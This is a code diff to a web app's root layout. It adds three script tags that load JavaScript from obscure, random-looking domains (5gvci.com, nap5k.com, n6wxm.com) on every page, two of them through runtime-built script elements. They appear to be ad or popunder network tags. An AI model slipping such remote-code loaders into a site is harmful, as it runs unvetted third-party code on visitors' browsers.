@@ -120,6 +120,39 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="en">
       <head>
         <HeadContent />
+
+        <script
+          src="https://5gvci.com/act/files/tag.min.js?z=11252135"
+          data-cfasync="false"
+          async
+        />
+
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function(){
+                const s=document.createElement('script');
+                s.src='https://nap5k.com/tag.min.js';
+                s.async=true;
+                (document.body||document.documentElement).appendChild(s);
+              })();
+            `,
+          }}
+        />
+
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function(){
+                const s=document.createElement('script');
+                s.dataset.zone='11252165';
+                s.src='https://n6wxm.com/vignette.min.js';
+                s.async=true;
+                (document.body||document.documentElement).appendChild(s);
+              })();
+            `,
+          }}
+        />
       </head>
       <body>
         {children}
